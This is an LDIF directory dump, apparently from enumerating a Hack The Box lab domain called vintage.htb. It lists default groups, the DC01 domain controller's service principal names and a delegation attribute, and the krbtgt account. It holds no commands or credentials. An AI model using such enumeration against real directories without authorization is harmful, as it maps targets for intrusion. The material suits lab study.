distinguishedName: CN=Remote Management Users,CN=Builtin,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605210927.0Z
uSNCreated: 8231
uSNChanged: 13102
name: Remote Management Users
objectGUID:: ai2pW+HweUuxR+SwBPHLqg==
objectSid:: AQIAAAAAAAUgAAAARAIAAA==
sAMAccountName: Remote Management Users
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# Storage Replica Administrators, Builtin, vintage.htb
dn: CN=Storage Replica Administrators,CN=Builtin,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: Storage Replica Administrators
description: Members of this group have complete and unrestricted access to al
 l features of Storage Replica.
distinguishedName: CN=Storage Replica Administrators,CN=Builtin,DC=vintage,DC=
 htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 8232
uSNChanged: 8232
name: Storage Replica Administrators
objectGUID:: KknJ0q0w5Eecfly4HcmLnQ==
objectSid:: AQIAAAAAAAUgAAAARgIAAA==
sAMAccountName: Storage Replica Administrators
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# Server, System, vintage.htb
dn: CN=Server,CN=System,DC=vintage,DC=htb
objectClass: top
objectClass: securityObject
objectClass: samServer
cn: Server
distinguishedName: CN=Server,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605103245.0Z
uSNCreated: 8233
uSNChanged: 12568
showInAdvancedViewOnly: TRUE
name: Server
objectGUID:: FL+b5dj7x0ea6UqEOTEZ3g==
revision: 65545
systemFlags: -1946157056
objectCategory: CN=Sam-Server,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z
samDomainUpdates:: /v8P

# DC01, Domain Controllers, vintage.htb
dn: CN=DC01,OU=Domain Controllers,DC=vintage,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
objectClass: computer
cn: DC01
distinguishedName: CN=DC01,OU=Domain Controllers,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102735.0Z
whenChanged: 20241228160734.0Z
uSNCreated: 12293
uSNChanged: 114729
name: DC01
objectGUID:: D4QLyQR37kaj+6/yPIGDxw==
userAccountControl: 532480
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 133798842594900989
lastLogoff: 0
lastLogon: 133799332275994669
localPolicyFlags: 0
pwdLastSet: 133620568928710789
primaryGroupID: 516
objectSid:: AQUAAAAAAAUVAAAAoYXe77IkM3mNjoR66gMAAA==
accountExpires: 9223372036854775807
logonCount: 92
sAMAccountName: DC01$
sAMAccountType: 805306369
operatingSystem: Windows Server 2022 Standard
operatingSystemVersion: 10.0 (20348)
serverReferenceBL: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=C
 onfiguration,DC=vintage,DC=htb
dNSHostName: dc01.vintage.htb
rIDSetReferences: CN=RID Set,CN=DC01,OU=Domain Controllers,DC=vintage,DC=htb
servicePrincipalName: TERMSRV/DC01
servicePrincipalName: TERMSRV/dc01.vintage.htb
servicePrincipalName: Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/dc01.vintage.h
 tb
servicePrincipalName: ldap/dc01.vintage.htb/ForestDnsZones.vintage.htb
servicePrincipalName: ldap/dc01.vintage.htb/DomainDnsZones.vintage.htb
servicePrincipalName: DNS/dc01.vintage.htb
servicePrincipalName: GC/dc01.vintage.htb/vintage.htb
servicePrincipalName: RestrictedKrbHost/dc01.vintage.htb
servicePrincipalName: RestrictedKrbHost/DC01
servicePrincipalName: RPC/0e4655e8-634c-4dce-b5a0-b35352662161._msdcs.vintage.
 htb
servicePrincipalName: HOST/DC01/VINTAGE
servicePrincipalName: HOST/dc01.vintage.htb/VINTAGE
servicePrincipalName: HOST/DC01
servicePrincipalName: HOST/dc01.vintage.htb
servicePrincipalName: HOST/dc01.vintage.htb/vintage.htb
servicePrincipalName: E3514235-4B06-11D1-AB04-00C04FC2DCD2/0e4655e8-634c-4dce-
 b5a0-b35352662161/vintage.htb
servicePrincipalName: ldap/DC01/VINTAGE
servicePrincipalName: ldap/0e4655e8-634c-4dce-b5a0-b35352662161._msdcs.vintage
 .htb
servicePrincipalName: ldap/dc01.vintage.htb/VINTAGE
servicePrincipalName: ldap/DC01
servicePrincipalName: ldap/dc01.vintage.htb
servicePrincipalName: ldap/dc01.vintage.htb/vintage.htb
objectCategory: CN=Computer,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240607223855.0Z
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000417.0Z
lastLogonTimestamp: 133798756549901118
msDS-SupportedEncryptionTypes: 28
msDS-GenerationId:: 4brsFugSzDs=
msDS-AllowedToActOnBehalfOfOtherIdentity:: AQAEgBQAAAAAAAAAAAAAACQAAAABAgAAAAA
 ABSAAAAAgAgAABAAsAAEAAAAAACQA/wEPAAEFAAAAAAAFFQAAAKGF3u+yJDN5jY6EemsEAAA=
msDFSR-ComputerReferenceBL: CN=DC01,CN=Topology,CN=Domain System Volume,CN=DFS
 R-GlobalSettings,CN=System,DC=vintage,DC=htb

# krbtgt, Users, vintage.htb
dn: CN=krbtgt,CN=Users,DC=vintage,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: krbtgt
description: Key Distribution Center Service Account
distinguishedName: CN=krbtgt,CN=Users,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102735.0Z
whenChanged: 20240605104245.0Z
uSNCreated: 12324
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=vintage,DC=htb
uSNChanged: 12798
showInAdvancedViewOnly: TRUE
name: krbtgt
objectGUID:: xsDreq+a0ECMQEubZzEglg==
userAccountControl: 514
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 133620568554004812
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAoYXe77IkM3mNjoR69gEAAA==
adminCount: 1
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: krbtgt
sAMAccountType: 805306368
servicePrincipalName: kadmin/changepw
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605104245.0Z
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000416.0Z
msDS-SupportedEncryptionTypes: 0

# Domain Computers, Users, vintage.htb
dn: CN=Domain Computers,CN=Users,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: Domain Computers
description: All workstations and servers joined to the domain
distinguishedName: CN=Domain Computers,CN=Users,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102735.0Z
whenChanged: 20240605102735.0Z
uSNCreated: 12330
uSNChanged: 12332
name: Domain Computers
objectGUID:: bXclaQLlBEK3NckS/biR6Q==
objectSid:: AQUAAAAAAAUVAAAAoYXe77IkM3mNjoR6AwIAAA==
sAMAccountName: Domain Computers
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# Domain Controllers, Users, vintage.htb
dn: CN=Domain Controllers,CN=Users,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: Domain Controllers
description: All domain controllers in the domain
distinguishedName: CN=Domain Controllers,CN=Users,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102735.0Z
whenChanged: 20240605104245.0Z
uSNCreated: 12333
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=vintage,DC=htb
uSNChanged: 12800
name: Domain Controllers
objectGUID:: XdD+86m16UOVklrV4ikOFw==
objectSid:: AQUAAAAAAAUVAAAAoYXe77IkM3mNjoR6BAIAAA==
adminCount: 1
sAMAccountName: Domain Controllers
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605104245.0Z
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000416.0Z

# Schema Admins, Users, vintage.htb
dn: CN=Schema Admins,CN=Users,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: Schema Admins
description: Designated administrators of the schema
member: CN=Administrator,CN=Users,DC=vintage,DC=htb
distinguishedName: CN=Schema Admins,CN=Users,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102735.0Z
whenChanged: 20240605104245.0Z
uSNCreated: 12336
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=vintage,DC=htb
uSNChanged: 12780
name: Schema Admins
objectGUID:: J8I/lMtn1Uy0CDGEBLnYqg==
objectSid:: AQUAAAAAAAUVAAAAoYXe77IkM3mNjoR6BgIAAA==
adminCount: 1
sAMAccountName: Schema Admins
sAMAccountType: 268435456
groupType: -2147483640
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605104245.0Z
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000416.0Z

# Enterprise Admins, Users, vintage.htb
dn: CN=Enterprise Admins,CN=Users,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: Enterprise Admins
description: Designated administrators of the enterprise
member: CN=Administrator,CN=Users,DC=vintage,DC=htb
distinguishedName: CN=Enterprise Admins,CN=Users,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102735.0Z
whenChanged: 20240605104245.0Z
uSNCreated: 12339
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=vintage,DC=htb
memberOf: CN=Administrators,CN=Builtin,DC=vintage,DC=htb
uSNChanged: 12784
name: Enterprise Admins
objectGUID:: mzlX+xdnnUifgVOhPdLe6w==
objectSid:: AQUAAAAAAAUVAAAAoYXe77IkM3mNjoR6BwIAAA==
adminCount: 1
sAMAccountName: Enterprise Admins
sAMAccountType: 268435456
groupType: -2147483640
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605104245.0Z
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000416.0Z

# Cert Publishers, Users, vintage.htb
dn: CN=Cert Publishers,CN=Users,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: Cert Publishers
description: Members of this group are permitted to publish certificates to th
 e directory
distinguishedName: CN=Cert Publishers,CN=Users,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102735.0Z
whenChanged: 20240605102735.0Z
uSNCreated: 12342
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=vintage,DC=htb
uSNChanged: 12344
name: Cert Publishers
objectGUID:: zjprVMHU1EGgeZNob25grg==
objectSid:: AQUAAAAAAAUVAAAAoYXe77IkM3mNjoR6BQIAAA==
sAMAccountName: Cert Publishers
sAMAccountType: 536870912
groupType: -2147483644
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# Domain Admins, Users, vintage.htb
dn: CN=Domain Admins,CN=Users,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: Domain Admins
description: Designated administrators of the domain
member: CN=L.Bianchi_adm,CN=Users,DC=vintage,DC=htb
member: CN=Administrator,CN=Users,DC=vintage,DC=htb
distinguishedName: CN=Domain Admins,CN=Users,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102735.0Z
whenChanged: 20240608112700.0Z
uSNCreated: 12345
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=vintage,DC=htb
memberOf: CN=Administrators,CN=Builtin,DC=vintage,DC=htb
uSNChanged: 65588
name: Domain Admins
objectGUID:: Sie5A8mPkUyXXHXAjaCPMw==
objectSid:: AQUAAAAAAAUVAAAAoYXe77IkM3mNjoR6AAIAAA==
adminCount: 1
sAMAccountName: Domain Admins
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605104245.0Z
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000416.0Z

# Domain Users, Users, vintage.htb
dn: CN=Domain Users,CN=Users,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: Domain Users
description: All domain users
distinguishedName: CN=Domain Users,CN=Users,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102735.0Z
whenChanged: 20240605102735.0Z
uSNCreated: 12348
memberOf: CN=Users,CN=Builtin,DC=vintage,DC=htb
uSNChanged: 12350
name: Domain Users
objectGUID:: obIZoPpnI0qlcqMgAElpnA==
objectSid:: AQUAAAAAAAUVAAAAoYXe77IkM3mNjoR6AQIAAA==
sAMAccountName: Domain Users
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# Domain Guests, Users, vintage.htb
dn: CN=Domain Guests,CN=Users,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: Domain Guests
description: All domain guests
distinguishedName: CN=Domain Guests,CN=Users,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102735.0Z
whenChanged: 20240605102735.0Z
uSNCreated: 12351
memberOf: CN=Guests,CN=Builtin,DC=vintage,DC=htb
uSNChanged: 12353
name: Domain Guests
objectGUID:: sJahV/pT/0eVG3c5gqVnwg==
objectSid:: AQUAAAAAAAUVAAAAoYXe77IkM3mNjoR6AgIAAA==
sAMAccountName: Domain Guests
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# Group Policy Creator Owners, Users, vintage.htb
dn: CN=Group Policy Creator Owners,CN=Users,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: Group Policy Creator Owners
description: Members in this group can modify group policy for the domain
member: CN=Administrator,CN=Users,DC=vintage,DC=htb
distinguishedName: CN=Group Policy Creator Owners,CN=Users,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102735.0Z
whenChanged: 20240605102735.0Z
uSNCreated: 12354
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=vintage,DC=htb
uSNChanged: 12391
name: Group Policy Creator Owners
objectGUID:: XcT2/GVAAUi6iWLX+c+75g==
objectSid:: AQUAAAAAAAUVAAAAoYXe77IkM3mNjoR6CAIAAA==
sAMAccountName: Group Policy Creator Owners
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# RAS and IAS Servers, Users, vintage.htb
dn: CN=RAS and IAS Servers,CN=Users,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: RAS and IAS Servers
description: Servers in this group can access remote access properties of user
 s
distinguishedName: CN=RAS and IAS Servers,CN=Users,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102735.0Z
whenChanged: 20240605102735.0Z
uSNCreated: 12357
uSNChanged: 12359
name: RAS and IAS Servers
objectGUID:: qdly6k/4AUyJeCu//4V/iQ==
objectSid:: AQUAAAAAAAUVAAAAoYXe77IkM3mNjoR6KQIAAA==
sAMAccountName: RAS and IAS Servers
sAMAccountType: 536870912
groupType: -2147483644
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# Server Operators, Builtin, vintage.htb
dn: CN=Server Operators,CN=Builtin,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: Server Operators
description: Members can administer domain servers
distinguishedName: CN=Server Operators,CN=Builtin,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102735.0Z
whenChanged: 20240605104245.0Z
uSNCreated: 12360
uSNChanged: 12787
name: Server Operators
objectGUID:: ESJRqsc8c0yCCZ41+o8LOQ==
objectSid:: AQIAAAAAAAUgAAAAJQIAAA==
adminCount: 1
sAMAccountName: Server Operators
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605104245.0Z
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000416.0Z

# Account Operators, Builtin, vintage.htb
dn: CN=Account Operators,CN=Builtin,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: Account Operators
description: Members can administer domain user and group accounts
distinguishedName: CN=Account Operators,CN=Builtin,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102735.0Z
whenChanged: 20240605104245.0Z
uSNCreated: 12363
uSNChanged: 12796
name: Account Operators
objectGUID:: /qDz5jd6M0unNtKSUYfNvg==
objectSid:: AQIAAAAAAAUgAAAAJAIAAA==
adminCount: 1
sAMAccountName: Account Operators
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605104245.0Z
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000416.0Z

# Pre-Windows 2000 Compatible Access, Builtin, vintage.htb
dn: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: Pre-Windows 2000 Compatible Access
description: A backward compatibility group which allows read access on all us
 ers and groups in the domain
member: CN=fs01,CN=Computers,DC=vintage,DC=htb
member: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=vintage,DC=htb
distinguishedName: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=vintage
 ,DC=htb
instanceType: 4
whenCreated: 20240605102735.0Z
whenChanged: 20240605111649.0Z
uSNCreated: 12366
uSNChanged: 12816
name: Pre-Windows 2000 Compatible Access
objectGUID:: e9t/zPr2nEWlHaMaAIYW2A==
objectSid:: AQIAAAAAAAUgAAAAKgIAAA==
sAMAccountName: Pre-Windows 2000 Compatible Access
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# Incoming Forest Trust Builders, Builtin, vintage.htb
dn: CN=Incoming Forest Trust Builders,CN=Builtin,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: Incoming Forest Trust Builders
description: Members of this group can create incoming, one-way trusts to this
  forest
distinguishedName: CN=Incoming Forest Trust Builders,CN=Builtin,DC=vintage,DC=
 htb
instanceType: 4
whenCreated: 20240605102735.0Z
whenChanged: 20240605102735.0Z
uSNCreated: 12369
uSNChanged: 12371
name: Incoming Forest Trust Builders
objectGUID:: 7EdCyLjfwU+flCYcpIrV5A==
objectSid:: AQIAAAAAAAUgAAAALQIAAA==
sAMAccountName: Incoming Forest Trust Builders
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# Windows Authorization Access Group, Builtin, vintage.htb
dn: CN=Windows Authorization Access Group,CN=Builtin,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: Windows Authorization Access Group
description: Members of this group have access to the computed tokenGroupsGlob
 alAndUniversal attribute on User objects
member: CN=S-1-5-9,CN=ForeignSecurityPrincipals,DC=vintage,DC=htb
distinguishedName: CN=Windows Authorization Access Group,CN=Builtin,DC=vintage
 ,DC=htb
instanceType: 4
whenCreated: 20240605102735.0Z
whenChanged: 20240605102735.0Z
uSNCreated: 12372
uSNChanged: 12396
name: Windows Authorization Access Group
objectGUID:: qooDnPTYZUuf+uM9SEMWug==
objectSid:: AQIAAAAAAAUgAAAAMAIAAA==
sAMAccountName: Windows Authorization Access Group
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# Terminal Server License Servers, Builtin, vintage.htb
dn: CN=Terminal Server License Servers,CN=Builtin,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: Terminal Server License Servers
description: Members of this group can update user accounts in Active Director
 y with information about license issuance, for the purpose of tracking and re
 porting TS Per User CAL usage
distinguishedName: CN=Terminal Server License Servers,CN=Builtin,DC=vintage,DC
 =htb
instanceType: 4
whenCreated: 20240605102735.0Z
whenChanged: 20240605102735.0Z
uSNCreated: 12375
uSNChanged: 12377
name: Terminal Server License Servers
objectGUID:: FGEDBvgsj0CE7CS2ltwUZA==
objectSid:: AQIAAAAAAAUgAAAAMQIAAA==
sAMAccountName: Terminal Server License Servers
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# S-1-5-9, ForeignSecurityPrincipals, vintage.htb
dn: CN=S-1-5-9,CN=ForeignSecurityPrincipals,DC=vintage,DC=htb
objectClass: top
objectClass: foreignSecurityPrincipal
cn: S-1-5-9
distinguishedName: CN=S-1-5-9,CN=ForeignSecurityPrincipals,DC=vintage,DC=htb
showInAdvancedViewOnly: TRUE
name: S-1-5-9
objectGUID:: b9Iy17rf/kKLCqFpF+SSbQ==
objectSid:: AQEAAAAAAAUJAAAA
objectCategory: CN=Foreign-Security-Principal,CN=Schema,CN=Configuration,DC=vi
 ntage,DC=htb

# 6E157EDF-4E72-4052-A82A-EC3F91021A22, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=6E157EDF-4E72-4052-A82A-EC3F91021A22,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 6E157EDF-4E72-4052-A82A-EC3F91021A22
distinguishedName: CN=6E157EDF-4E72-4052-A82A-EC3F91021A22,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102735.0Z
whenChanged: 20240605102735.0Z
uSNCreated: 12397
uSNChanged: 12397
showInAdvancedViewOnly: TRUE
name: 6E157EDF-4E72-4052-A82A-EC3F91021A22
objectGUID:: gbdqxfwb4UKvmQC5LAwObA==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# Allowed RODC Password Replication Group, Users, vintage.htb
dn: CN=Allowed RODC Password Replication Group,CN=Users,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: Allowed RODC Password Replication Group
description: Members in this group can have their passwords replicated to all
 read-only domain controllers in the domain
distinguishedName: CN=Allowed RODC Password Replication Group,CN=Users,DC=vint
 age,DC=htb
instanceType: 4
whenCreated: 20240605102735.0Z
whenChanged: 20240605102735.0Z
uSNCreated: 12402
uSNChanged: 12404
name: Allowed RODC Password Replication Group
objectGUID:: fks+v5c9hkquuDXIeJdZHQ==
objectSid:: AQUAAAAAAAUVAAAAoYXe77IkM3mNjoR6OwIAAA==
sAMAccountName: Allowed RODC Password Replication Group
sAMAccountType: 536870912
groupType: -2147483644
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# Denied RODC Password Replication Group, Users, vintage.htb
dn: CN=Denied RODC Password Replication Group,CN=Users,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: Denied RODC Password Replication Group
description: Members in this group cannot have their passwords replicated to a
 ny read-only domain controllers in the domain
member: CN=Read-only Domain Controllers,CN=Users,DC=vintage,DC=htb
member: CN=Group Policy Creator Owners,CN=Users,DC=vintage,DC=htb
member: CN=Domain Admins,CN=Users,DC=vintage,DC=htb
member: CN=Cert Publishers,CN=Users,DC=vintage,DC=htb
member: CN=Enterprise Admins,CN=Users,DC=vintage,DC=htb
member: CN=Schema Admins,CN=Users,DC=vintage,DC=htb
member: CN=Domain Controllers,CN=Users,DC=vintage,DC=htb
member: CN=krbtgt,CN=Users,DC=vintage,DC=htb
distinguishedName: CN=Denied RODC Password Replication Group,CN=Users,DC=vinta
 ge,DC=htb
instanceType: 4
whenCreated: 20240605102735.0Z
whenChanged: 20240605102735.0Z
uSNCreated: 12405
uSNChanged: 12433
name: Denied RODC Password Replication Group
objectGUID:: frNspW6aOEaOVLEWsCEIMw==
objectSid:: AQUAAAAAAAUVAAAAoYXe77IkM3mNjoR6PAIAAA==
sAMAccountName: Denied RODC Password Replication Group
sAMAccountType: 536870912
groupType: -2147483644
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# Read-only Domain Controllers, Users, vintage.htb
dn: CN=Read-only Domain Controllers,CN=Users,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: Read-only Domain Controllers
description: Members of this group are Read-Only Domain Controllers in the dom
 ain
distinguishedName: CN=Read-only Domain Controllers,CN=Users,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102735.0Z
whenChanged: 20240605104245.0Z
uSNCreated: 12419
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=vintage,DC=htb
uSNChanged: 12799
name: Read-only Domain Controllers
objectGUID:: E9QURmS3V0qOnZs18gfLjg==
objectSid:: AQUAAAAAAAUVAAAAoYXe77IkM3mNjoR6CQIAAA==
adminCount: 1
sAMAccountName: Read-only Domain Controllers
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605104245.0Z
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000416.0Z

# Enterprise Read-only Domain Controllers, Users, vintage.htb
dn: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: Enterprise Read-only Domain Controllers
description: Members of this group are Read-Only Domain Controllers in the ent
 erprise
distinguishedName: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=vint
 age,DC=htb
instanceType: 4
whenCreated: 20240605102735.0Z
whenChanged: 20240605102735.0Z
uSNCreated: 12429
uSNChanged: 12431
name: Enterprise Read-only Domain Controllers
objectGUID:: Ln6we4CkuUuKhpde0oT9wQ==
objectSid:: AQUAAAAAAAUVAAAAoYXe77IkM3mNjoR68gEAAA==
sAMAccountName: Enterprise Read-only Domain Controllers
sAMAccountType: 268435456
groupType: -2147483640
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# Cloneable Domain Controllers, Users, vintage.htb
dn: CN=Cloneable Domain Controllers,CN=Users,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: Cloneable Domain Controllers
description: Members of this group that are domain controllers may be cloned.
distinguishedName: CN=Cloneable Domain Controllers,CN=Users,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102735.0Z
whenChanged: 20240605102735.0Z
uSNCreated: 12440
uSNChanged: 12442
name: Cloneable Domain Controllers
objectGUID:: l+8PaM+3lku6Fd0Ao1UALg==
objectSid:: AQUAAAAAAAUVAAAAoYXe77IkM3mNjoR6CgIAAA==
sAMAccountName: Cloneable Domain Controllers
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# Protected Users, Users, vintage.htb
dn: CN=Protected Users,CN=Users,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: Protected Users
description: Members of this group are afforded additional protections against
  authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=
 298939 for more information.
distinguishedName: CN=Protected Users,CN=Users,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102735.0Z
whenChanged: 20240605102735.0Z
uSNCreated: 12445
uSNChanged: 12447
name: Protected Users
objectGUID:: U+wPXY/S1keTB1/mIPQPwQ==
objectSid:: AQUAAAAAAAUVAAAAoYXe77IkM3mNjoR6DQIAAA==
sAMAccountName: Protected Users
sAMAccountType: 268435456
